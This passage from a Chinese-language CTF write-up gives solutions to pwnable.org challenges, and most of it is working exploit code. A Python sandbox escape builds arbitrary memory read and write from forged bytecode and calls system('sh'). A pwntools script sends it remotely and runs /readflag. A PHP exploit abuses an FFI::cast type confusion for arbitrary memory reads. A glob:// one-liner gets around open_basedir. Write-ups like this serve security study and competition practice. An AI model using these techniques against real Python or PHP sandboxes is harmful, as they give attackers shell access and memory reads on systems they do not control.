<p>builtins 可以通过 subclasses 搞出来，然后字节码搞出任意读写过 audit 就 ok 了。</p>
<p>执行是 eval ，执行不了语句，所以还需要用 exec 包一下：</p>
<pre class="hljs"><code>DEBUG = <span class="hljs-literal">False</span>
DOCKER = <span class="hljs-literal">False</span>
<span class="hljs-keyword">if</span> DEBUG:
    i = <span class="hljs-number">139</span>
    <span class="hljs-keyword">if</span> DOCKER:
        i = <span class="hljs-number">185</span>
<span class="hljs-keyword">else</span>:
    i = <span class="hljs-number">183</span>

sys = <span class="hljs-string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="hljs-number">1</span>].__subclasses__()[i]()._module.sys;
modules = sys.modules
builtins = modules[<span class="hljs-string">&#x27;builtins&#x27;</span>]
types = modules[<span class="hljs-string">&#x27;types&#x27;</span>]
    
<span class="hljs-built_in">id</span> = builtins.<span class="hljs-built_in">id</span>
<span class="hljs-built_in">print</span> = builtins.<span class="hljs-built_in">print</span>
<span class="hljs-built_in">hex</span> = builtins.<span class="hljs-built_in">hex</span>
<span class="hljs-built_in">bytearray</span> = builtins.<span class="hljs-built_in">bytearray</span>
<span class="hljs-built_in">bytes</span> = builtins.<span class="hljs-built_in">bytes</span>
<span class="hljs-built_in">range</span> = builtins.<span class="hljs-built_in">range</span>
<span class="hljs-built_in">len</span> = builtins.<span class="hljs-built_in">len</span>
<span class="hljs-built_in">type</span> = builtins.<span class="hljs-built_in">type</span>
<span class="hljs-built_in">object</span> = builtins.<span class="hljs-built_in">object</span>
<span class="hljs-built_in">ord</span> = builtins.<span class="hljs-built_in">ord</span>


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">p64</span>(<span class="hljs-params">x</span>):</span>
    b = <span class="hljs-string">b&#x27;&#x27;</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>]:
        mask = (<span class="hljs-number">1</span> &lt;&lt; ((i + <span class="hljs-number">1</span>) &lt;&lt; <span class="hljs-number">3</span>)) - <span class="hljs-number">1</span>
        cur = (mask &amp; x) &gt;&gt; (i &lt;&lt; <span class="hljs-number">3</span>)
        b += <span class="hljs-built_in">bytes</span>([cur])
    <span class="hljs-keyword">return</span> b


<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">make_arb</span>(<span class="hljs-params">addr, size=<span class="hljs-number">0x1000</span></span>):</span>
    a = (<span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>)
    b = (<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>)
    consts = (<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>)
    fake_bytearray = p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-built_in">id</span>(<span class="hljs-built_in">bytearray</span>)) + p64(size) + p64(size) + p64(addr) + p64(addr) + p64(addr)

    pointer = p64(<span class="hljs-built_in">id</span>(fake_bytearray) + <span class="hljs-number">0x20</span>)

    consts_buf = <span class="hljs-built_in">id</span>(consts) + <span class="hljs-number">0x18</span>
    pointer_buf = <span class="hljs-built_in">id</span>(pointer) + <span class="hljs-number">0x20</span>

    offset = (pointer_buf - consts_buf) // <span class="hljs-number">8</span>

    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">func</span>():</span>
        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>

    code = <span class="hljs-string">b&#x27;\x90&#x27;</span> + <span class="hljs-built_in">bytes</span>([(offset &amp; <span class="hljs-number">0xff0000</span>) &gt;&gt; <span class="hljs-number">16</span>])
    code += <span class="hljs-string">b&#x27;\x90&#x27;</span> + <span class="hljs-built_in">bytes</span>([(offset &amp; <span class="hljs-number">0xff00</span>) &gt;&gt; <span class="hljs-number">8</span>])
    code += <span class="hljs-string">b&#x27;d&#x27;</span> + <span class="hljs-built_in">bytes</span>([offset &amp; <span class="hljs-number">0xff</span>])
    code += <span class="hljs-string">b&#x27;S\x00&#x27;</span>
    func.__code__ = func.__code__.replace(co_code=code, co_consts=consts)

    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(offset))

    <span class="hljs-keyword">return</span> func()

<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arb_call</span>(<span class="hljs-params">addr, arg1=<span class="hljs-string">&#x27;&#x27;</span></span>):</span>
    a = <span class="hljs-built_in">type</span>(<span class="hljs-string">&#x27;fuck&#x27;</span>, (<span class="hljs-built_in">object</span>,), {})
    type_rw = make_arb(<span class="hljs-built_in">id</span>(a))
    target = p64(addr)

    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>]:
        type_rw[<span class="hljs-number">0x80</span> + i] = target[i]

    x = a()
    obj_rw = make_arb(<span class="hljs-built_in">id</span>(x))
    adjust = -<span class="hljs-number">1</span>
    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(arg1)):
        c = arg1[i]
        obj_rw[i] = <span class="hljs-built_in">ord</span>(c) + adjust
        <span class="hljs-keyword">if</span> adjust != <span class="hljs-number">0</span>:
            adjust = <span class="hljs-number">0</span>

    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;fuck yeah!&#x27;</span>)
    x()
    
<span class="hljs-keyword">if</span> DEBUG <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> DOCKER:
    base = <span class="hljs-built_in">id</span>(<span class="hljs-built_in">type</span>) - <span class="hljs-number">0x364160</span>
    system_call = base + <span class="hljs-number">0xa3c9d</span>
<span class="hljs-keyword">else</span>:
    base = <span class="hljs-built_in">id</span>(<span class="hljs-built_in">type</span>) - <span class="hljs-number">0x358940</span>
    system_call = base + <span class="hljs-number">0xf1553</span>

arb_call(system_call, <span class="hljs-string">&#x27;sh&#x27;</span>)</code></pre><p>执行脚本：</p>
<pre class="hljs"><code>from pwn import<span class="hljs-operator"> *
</span>context(log_level=&#x27;debug&#x27;)

DEBUG = False
DOCKER = False

def read<span class="hljs-constructor">_sandbox_bin()</span>:
    io.recvuntil(b<span class="hljs-string">&quot;&gt;&gt;&gt;&quot;</span>)
    io.sendline(b<span class="hljs-string">&quot;sandbox&quot;</span>)
    data = io.recvuntil(b<span class="hljs-string">&quot;\n&quot;</span>).strip<span class="hljs-literal">()</span>
    return data

def send<span class="hljs-constructor">_code()</span>:
    io.recvuntil(b<span class="hljs-string">&quot;&gt;&gt;&gt;&quot;</span>)
    <span class="hljs-keyword">if</span> DEBUG:
        <span class="hljs-keyword">if</span> DOCKER:
            io.sendline(b<span class="hljs-character">&#x27;\&#x27;</span>\&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span>-<span class="hljs-number">1</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">185</span>]</span><span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_module</span>.</span></span>sys.modules<span class="hljs-literal">[\&#x27;<span class="hljs-identifier">builtins</span>\&#x27;]</span>.exec(\<span class="hljs-character">&#x27;\&#x27;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span>-<span class="hljs-number">1</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">185</span>]</span><span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_module</span>.</span></span>sys.modules<span class="hljs-literal">[\&#x27;<span class="hljs-identifier">builtins</span>\&#x27;]</span>.input<span class="hljs-literal">()</span>)&#x27;)
        <span class="hljs-keyword">else</span>:
            io.sendline(b<span class="hljs-character">&#x27;\&#x27;</span>\&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span>-<span class="hljs-number">1</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">139</span>]</span><span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_module</span>.</span></span>sys.modules<span class="hljs-literal">[\&#x27;<span class="hljs-identifier">builtins</span>\&#x27;]</span>.exec(\<span class="hljs-character">&#x27;\&#x27;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span>-<span class="hljs-number">1</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">139</span>]</span><span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_module</span>.</span></span>sys.modules<span class="hljs-literal">[\&#x27;<span class="hljs-identifier">builtins</span>\&#x27;]</span>.input<span class="hljs-literal">()</span>)&#x27;)
    <span class="hljs-keyword">else</span>:
        io.sendline(b<span class="hljs-character">&#x27;\&#x27;</span>\&#x27;.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span>-<span class="hljs-number">1</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">183</span>]</span><span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_module</span>.</span></span>sys.modules<span class="hljs-literal">[\&#x27;<span class="hljs-identifier">builtins</span>\&#x27;]</span>.exec(\<span class="hljs-character">&#x27;\&#x27;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span>-<span class="hljs-number">1</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">183</span>]</span><span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_module</span>.</span></span>sys.modules<span class="hljs-literal">[\&#x27;<span class="hljs-identifier">builtins</span>\&#x27;]</span>.input<span class="hljs-literal">()</span>)&#x27;)

    &#x27;&#x27;&#x27;
    <span class="hljs-keyword">if</span> DEBUG:
        <span class="hljs-keyword">if</span> DOCKER:
            io.sendline(b&#x27;sys = \<span class="hljs-character">&#x27;\&#x27;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span>-<span class="hljs-number">1</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">185</span>]</span><span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_module</span>.</span></span>sys; modules=sys.modules; builtins=sys.modules<span class="hljs-literal">[\&#x27;<span class="hljs-identifier">builtins</span>\&#x27;]</span>; builtins.exec(\<span class="hljs-character">&#x27;\&#x27;</span>.join(sys.stdin.readlines<span class="hljs-literal">()</span>))&#x27;)
        <span class="hljs-keyword">else</span>:
            io.sendline(b&#x27;sys = \<span class="hljs-character">&#x27;\&#x27;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span>-<span class="hljs-number">1</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">139</span>]</span><span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_module</span>.</span></span>sys; modules=sys.modules; builtins=sys.modules<span class="hljs-literal">[\&#x27;<span class="hljs-identifier">builtins</span>\&#x27;]</span>; builtins.exec(\<span class="hljs-character">&#x27;\&#x27;</span>.join(sys.stdin.readlines<span class="hljs-literal">()</span>))&#x27;)
    <span class="hljs-keyword">else</span>:
        io.sendline(b&#x27;sys = \<span class="hljs-character">&#x27;\&#x27;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span>-<span class="hljs-number">1</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[<span class="hljs-number">183</span>]</span><span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_module</span>.</span></span>sys; modules=sys.modules; builtins=sys.modules<span class="hljs-literal">[\&#x27;<span class="hljs-identifier">builtins</span>\&#x27;]</span>; builtins.exec(\<span class="hljs-character">&#x27;\&#x27;</span>.join(sys.stdin.readlines<span class="hljs-literal">()</span>))&#x27;)
    &#x27;&#x27;&#x27;

    payload = &#x27;builtins=\<span class="hljs-character">&#x27;\&#x27;</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">__class__</span>.</span><span class="hljs-module"><span class="hljs-identifier">__mro__</span>[</span></span>-<span class="hljs-number">1</span>].<span class="hljs-constructor">__subclasses__()</span><span class="hljs-literal">[{}]</span><span class="hljs-literal">()</span>.<span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">_module</span>.</span></span>sys.modules<span class="hljs-literal">[\&#x27;<span class="hljs-identifier">builtins</span>\&#x27;]</span>; builtins.exec({})&#x27;

    <span class="hljs-keyword">with</span> <span class="hljs-keyword">open</span>(&#x27;arb.py&#x27;, <span class="hljs-character">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:
        content = f.read<span class="hljs-literal">()</span>

    <span class="hljs-keyword">if</span> DEBUG:
        <span class="hljs-keyword">if</span> DOCKER:
            i = <span class="hljs-number">185</span>
        <span class="hljs-keyword">else</span>:
            i = <span class="hljs-number">139</span>
    <span class="hljs-keyword">else</span>:
        i = <span class="hljs-number">183</span>

    io.info(repr(content))
    payload = payload.format(i, repr(content))

    io.sendline(payload)
    io.recvuntil(&#x27;fuck yeah!&#x27;)

    io.sendline(&#x27;/readflag&#x27;)

    io.interactive<span class="hljs-literal">()</span>

            
<span class="hljs-keyword">if</span> DEBUG:
    io = process(<span class="hljs-literal">[&#x27;<span class="hljs-identifier">python</span>&#x27;, &#x27;<span class="hljs-identifier">run</span>.<span class="hljs-identifier">py</span>&#x27;]</span>)
<span class="hljs-keyword">else</span>:
    io = remote(<span class="hljs-string">&quot;pwnable.org&quot;</span>, <span class="hljs-number">41337</span>)

#data =read<span class="hljs-constructor">_sandbox_bin()</span>

#a = eval(data)
#<span class="hljs-keyword">with</span> <span class="hljs-keyword">open</span>(<span class="hljs-string">&quot;sandbox&quot;</span>,<span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:
#    f.write(a)
send<span class="hljs-constructor">_code()</span>
</code></pre><h3 id="noeasyphp"><a class="header-link" href="#noeasyphp"></a>noeasyphp</h3>
<p>利用 <code>FFI::cast</code> 类型混淆搞个任意读，然后读 ffi 结构体里的 symbols。</p>
<pre class="hljs"><code><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> urllib.parse

def main():
    src <span class="hljs-operator">=</span> &#x27;&#x27;&#x27;
error_reporting(<span class="hljs-type">E_ALL</span>);

register_shutdown_function(<span class="hljs-string">&quot;fatal_handler&quot;</span>);
function fatal_handler(){
    <span class="hljs-variable">$errfile</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;unknown file&quot;</span>;
    <span class="hljs-variable">$errstr</span>  <span class="hljs-operator">=</span> <span class="hljs-string">&quot;shutdown&quot;</span>;
    <span class="hljs-variable">$errno</span>   <span class="hljs-operator">=</span> <span class="hljs-type">E_CORE_ERROR</span>;
    <span class="hljs-variable">$errline</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>;
    <span class="hljs-variable">$error</span> <span class="hljs-operator">=</span> error_get_last();
    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$error</span> <span class="hljs-operator">!==</span> <span class="hljs-type">NULL</span>) {
        <span class="hljs-variable">$errno</span>   <span class="hljs-operator">=</span> <span class="hljs-variable">$error</span>[<span class="hljs-string">&quot;type&quot;</span>];
        <span class="hljs-variable">$errfile</span> <span class="hljs-operator">=</span> <span class="hljs-variable">$error</span>[<span class="hljs-string">&quot;file&quot;</span>];
        <span class="hljs-variable">$errline</span> <span class="hljs-operator">=</span> <span class="hljs-variable">$error</span>[<span class="hljs-string">&quot;line&quot;</span>];
        <span class="hljs-variable">$errstr</span>  <span class="hljs-operator">=</span> <span class="hljs-variable">$error</span>[<span class="hljs-string">&quot;message&quot;</span>];
        var_dump(<span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, <span class="hljs-variable">$errfile</span>, <span class="hljs-variable">$errline</span>);
    }
}

<span class="hljs-comment">// read ffi_addr + 0x40: symbols</span>
function read_addr8(<span class="hljs-variable">$addr</span>) {
    <span class="hljs-variable">$b</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::new(&#x27;long[<span class="hljs-number">2</span>]&#x27;); <span class="hljs-comment">// 0x60</span>
    <span class="hljs-variable">$b</span>[<span class="hljs-number">0</span>] <span class="hljs-operator">=</span> <span class="hljs-variable">$addr</span>;
    <span class="hljs-variable">$tmp</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::cast(<span class="hljs-string">&quot;long*[2]&quot;</span>, <span class="hljs-variable">$b</span>);
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$tmp</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];
}

function read_addr_size(<span class="hljs-variable">$addr</span>, <span class="hljs-variable">$size</span>) {
 <span class="hljs-variable">$s</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;
 <span class="hljs-variable">$tmp</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::new(&#x27;long[<span class="hljs-number">2</span>]&#x27;);
 <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">&lt;=</span> <span class="hljs-variable">$size</span>; <span class="hljs-variable">$i</span><span class="hljs-operator">++</span>) {
  <span class="hljs-variable">$tmp</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::cast(&#x27;long[<span class="hljs-number">2</span>]&#x27;, <span class="hljs-variable">$tmp</span>);
  <span class="hljs-variable">$tmp</span>[<span class="hljs-number">0</span>] <span class="hljs-operator">=</span> <span class="hljs-variable">$addr</span> <span class="hljs-operator">+</span> <span class="hljs-variable">$i</span>;
  <span class="hljs-variable">$tmp</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::cast(<span class="hljs-string">&quot;char*[2]&quot;</span>, <span class="hljs-variable">$tmp</span>);
  <span class="hljs-variable">$s</span> <span class="hljs-operator">.=</span> <span class="hljs-variable">$tmp</span>[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>];
 }
 <span class="hljs-keyword">return</span> <span class="hljs-variable">$s</span>;
}

function var_dump_ret(<span class="hljs-variable">$mixed</span> <span class="hljs-operator">=</span> null) {
  ob_start();
  var_dump(<span class="hljs-variable">$mixed</span>);
  <span class="hljs-variable">$content</span> <span class="hljs-operator">=</span> ob_get_contents();
  ob_end_clean();
  <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;
}

<span class="hljs-variable">$temp1</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::new(&#x27;long[<span class="hljs-number">12</span>]&#x27;);
<span class="hljs-variable">$temp2</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::new(&#x27;long[<span class="hljs-number">12</span>]&#x27;);
<span class="hljs-variable">$ffi</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::load(<span class="hljs-string">&quot;/flag.h&quot;</span>);
<span class="hljs-variable">$temp3</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::new(&#x27;long[<span class="hljs-number">12</span>]&#x27;);
<span class="hljs-variable">$temp4</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::new(&#x27;long[<span class="hljs-number">12</span>]&#x27;);
<span class="hljs-variable">$temp5</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::new(&#x27;long[<span class="hljs-number">12</span>]&#x27;);
<span class="hljs-variable">$temp6</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::new(&#x27;long[<span class="hljs-number">12</span>]&#x27;);
<span class="hljs-variable">$temp7</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::new(&#x27;long[<span class="hljs-number">12</span>]&#x27;);
<span class="hljs-variable">$temp8</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::new(&#x27;long[<span class="hljs-number">12</span>]&#x27;);
<span class="hljs-variable">$temp9</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::new(&#x27;long[<span class="hljs-number">12</span>]&#x27;);

function read_cdata_addr(<span class="hljs-variable">$cdata</span>) {
    <span class="hljs-variable">$h</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::cast(&#x27;long<span class="hljs-operator">*</span>&#x27;, <span class="hljs-variable">$cdata</span>);
    <span class="hljs-variable">$h</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::cast(&#x27;long&#x27;, <span class="hljs-variable">$h</span>);

    <span class="hljs-variable">$heap_addr_new</span> <span class="hljs-operator">=</span> var_dump_ret(<span class="hljs-variable">$h</span>);
    <span class="hljs-variable">$heap_addr_new</span> <span class="hljs-operator">=</span> explode(&#x27;int(&#x27;, <span class="hljs-variable">$heap_addr_new</span>);
    <span class="hljs-variable">$heap_addr_new</span> <span class="hljs-operator">=</span> explode(&#x27;)&#x27;, <span class="hljs-variable">$heap_addr_new</span>[<span class="hljs-number">1</span>])[<span class="hljs-number">0</span>];
    <span class="hljs-variable">$heap_addr</span> <span class="hljs-operator">=</span> (int)<span class="hljs-variable">$heap_addr_new</span>;
    <span class="hljs-keyword">return</span> <span class="hljs-variable">$heap_addr</span>;
}

echo &#x27;<span class="hljs-operator">===</span>temp1 addr<span class="hljs-operator">===</span>\n&#x27;;
var_dump(dechex(read_cdata_addr(<span class="hljs-variable">$temp1</span>)));
echo &#x27;<span class="hljs-operator">===</span>temp2 addr<span class="hljs-operator">===</span>\n&#x27;;
var_dump(dechex(read_cdata_addr(<span class="hljs-variable">$temp2</span>)));
echo &#x27;<span class="hljs-operator">===</span>temp3 addr<span class="hljs-operator">===</span>\n&#x27;;
var_dump(dechex(read_cdata_addr(<span class="hljs-variable">$temp3</span>)));
echo &#x27;<span class="hljs-operator">===</span>temp4 addr<span class="hljs-operator">===</span>\n&#x27;;
var_dump(dechex(read_cdata_addr(<span class="hljs-variable">$temp4</span>)));

echo <span class="hljs-string">&quot;===START===<span class="hljs-subst">\n</span>&quot;</span>;
<span class="hljs-variable">$b</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::new(&#x27;long[<span class="hljs-number">12</span>]&#x27;); <span class="hljs-comment">// 0x60</span>
<span class="hljs-variable">$b</span>[<span class="hljs-number">0</span>] <span class="hljs-operator">=</span> <span class="hljs-number">0xdeadbeef</span>;
<span class="hljs-variable">$b</span>[<span class="hljs-number">1</span>] <span class="hljs-operator">=</span> <span class="hljs-number">0xbeefdead</span>;
<span class="hljs-variable">$heap</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::cast(<span class="hljs-string">&quot;long*&quot;</span>, <span class="hljs-variable">$b</span>);
<span class="hljs-variable">$heap</span> <span class="hljs-operator">=</span> <span class="hljs-type">FFI</span>::cast(<span class="hljs-string">&quot;long&quot;</span>, <span class="hljs-variable">$heap</span>);

echo <span class="hljs-string">&quot;===Getting Heap Addr===<span class="hljs-subst">\n</span>&quot;</span>;
<span class="hljs-variable">$heap_addr_new</span> <span class="hljs-operator">=</span> var_dump_ret(<span class="hljs-variable">$heap</span>);
<span class="hljs-variable">$heap_addr_new</span> <span class="hljs-operator">=</span> explode(&#x27;int(&#x27;, <span class="hljs-variable">$heap_addr_new</span>);
<span class="hljs-variable">$heap_addr_new</span> <span class="hljs-operator">=</span> explode(&#x27;)&#x27;, <span class="hljs-variable">$heap_addr_new</span>[<span class="hljs-number">1</span>])[<span class="hljs-number">0</span>];
<span class="hljs-variable">$heap_addr</span> <span class="hljs-operator">=</span> (int)<span class="hljs-variable">$heap_addr_new</span>;
echo <span class="hljs-string">&quot;===Done Getting Heap Addr===<span class="hljs-subst">\n</span>&quot;</span>;

<span class="hljs-comment">//$ffi_addr = $heap_addr - 0x60;</span>
<span class="hljs-variable">$ffi_addr</span> <span class="hljs-operator">=</span> read_cdata_addr(<span class="hljs-variable">$temp3</span>) <span class="hljs-operator">+</span> <span class="hljs-number">0x60</span>;

echo <span class="hljs-string">&quot;===READ_ADDR_STARTS===<span class="hljs-subst">\n</span>&quot;</span>;
echo <span class="hljs-string">&quot;--&gt; Stage 1<span class="hljs-subst">\n</span>&quot;</span>;
var_dump(dechex(<span class="hljs-variable">$ffi_addr</span>)); <span class="hljs-comment">// 0x660</span>
<span class="hljs-variable">$symbols_addr</span> <span class="hljs-operator">=</span> read_addr8(<span class="hljs-variable">$ffi_addr</span><span class="hljs-operator">+</span><span class="hljs-number">0x40</span>);
var_dump(dechex(<span class="hljs-variable">$symbols_addr</span>));
echo <span class="hljs-string">&quot;--&gt; Stage 2<span class="hljs-subst">\n</span>&quot;</span>;
<span class="hljs-variable">$symbols_bucket</span> <span class="hljs-operator">=</span> read_addr8(<span class="hljs-variable">$symbols_addr</span><span class="hljs-operator">+</span><span class="hljs-number">0x10</span>);
var_dump(dechex(<span class="hljs-variable">$symbols_bucket</span>));
echo <span class="hljs-string">&quot;--&gt; Stage 3<span class="hljs-subst">\n</span>&quot;</span>;
<span class="hljs-variable">$symbols_string</span> <span class="hljs-operator">=</span> read_addr8(<span class="hljs-variable">$symbols_bucket</span><span class="hljs-operator">+</span><span class="hljs-number">0x18</span>);
var_dump(dechex(<span class="hljs-variable">$symbols_string</span>));
echo <span class="hljs-string">&quot;--&gt; Stage 4<span class="hljs-subst">\n</span>&quot;</span>;
<span class="hljs-variable">$string_len</span> <span class="hljs-operator">=</span> read_addr8(<span class="hljs-variable">$symbols_string</span><span class="hljs-operator">+</span><span class="hljs-number">0x10</span>);
var_dump(<span class="hljs-variable">$string_len</span>);
echo <span class="hljs-string">&quot;--&gt; Stage 5<span class="hljs-subst">\n</span>&quot;</span>;
<span class="hljs-variable">$string_len</span> <span class="hljs-operator">=</span> read_addr8(<span class="hljs-variable">$symbols_string</span><span class="hljs-operator">+</span><span class="hljs-number">0x10</span>);
var_dump(dechex(<span class="hljs-variable">$string_len</span>));
var_dump(read_addr_size(<span class="hljs-variable">$symbols_string</span><span class="hljs-operator">+</span><span class="hljs-number">0x18</span>, <span class="hljs-variable">$string_len</span>));
<span class="hljs-comment">//var_dump(dechex(read_addr8($symbols_string+0x18)));</span>
echo &#x27;<span class="hljs-operator">---</span> done <span class="hljs-operator">---</span>\n&#x27;;

<span class="hljs-variable">$flag</span> <span class="hljs-operator">=</span> <span class="hljs-variable">$ffi</span>-&gt;flag_wAt3_uP_apA3H1();

<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> <span class="hljs-operator">&lt;</span> <span class="hljs-number">30</span>; <span class="hljs-variable">$i</span><span class="hljs-operator">++</span>) {
  echo <span class="hljs-variable">$flag</span>[<span class="hljs-variable">$i</span>];
}
&#x27;&#x27;&#x27;
    #res <span class="hljs-operator">=</span> requests.get(&#x27;&#x27;&#x27;http:<span class="hljs-comment">//pwnable.org:19261/?rh=$ffi = FFI::load(&quot;/flag.h&quot;);$b = FFI::new(&#x27;long[12]&#x27;);$heap = FFI::cast(&quot;long*&quot;, $b); $heap = FFI::cast(&quot;long&quot;, $heap); $arr = FFI::new(&#x27;long[1]&#x27;); $arr[0] = $heap; $heap_addr = $arr[0]; $ffi_addr = $heap_addr - 0x60; function read_addr8()&#x27;&#x27;&#x27;)</span>
    res <span class="hljs-operator">=</span> requests.get(&#x27;http:<span class="hljs-comment">//pwnable.org:19261/?rh={}&#x27;.format(urllib.parse.quote(src)))</span>
    <span class="hljs-built_in">print</span>(res)
    <span class="hljs-built_in">print</span>(res.text)


<span class="hljs-keyword">if</span> __name__ <span class="hljs-operator">==</span> <span class="hljs-string">&quot;__main__&quot;</span>:
    main()</code></pre><h3 id="easyphp"><a class="header-link" href="#easyphp"></a>easyphp</h3>
<p>列目录，看到/flag,so
<code>$a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f){echo($f-&gt;__toString().&#39; &#39;);};</code></p>
<p>题目的openbasedir一直在变，多请求几次就行了
<img src="https://i.imgur.com/ze3akVH.png" alt=""></p>
